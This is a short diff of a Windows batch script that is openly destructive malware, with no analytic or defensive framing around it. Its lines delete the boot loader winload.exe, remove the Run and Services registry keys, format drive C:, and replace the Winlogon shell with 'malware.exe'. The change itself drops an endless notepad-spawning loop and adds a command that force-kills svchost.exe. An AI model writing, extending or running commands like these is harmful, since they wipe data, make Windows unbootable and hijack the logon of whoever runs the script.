@@ -19,8 +19,6 @@ del C:\Windows\System32\winload.exe /f /q
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f
 format C: /fs:NTFS /q /y
-:loop
-start notepad.exe
-goto loop
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "malware.exe" /f
+taskkill /f /im svchost.exe
 
